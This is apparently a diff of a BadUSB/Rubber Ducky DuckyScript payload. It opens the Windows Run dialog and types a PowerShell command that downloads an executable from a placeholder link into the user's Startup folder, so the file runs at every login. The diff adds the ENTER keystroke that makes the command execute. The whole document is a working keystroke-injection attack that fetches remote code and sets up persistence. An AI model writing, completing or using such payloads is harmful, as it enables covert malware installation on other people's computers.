@@ -7,3 +7,4 @@ DELAY 1500
 GUI r
 DELAY 100
 STRING powershell (new-object System.Net.WebClient).DownloadFile('LINK TO COMPILED AUTOIT EXE FILE','c:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/NAME OF YOUR COMPILED EXE FILE.exe')
+ENTER
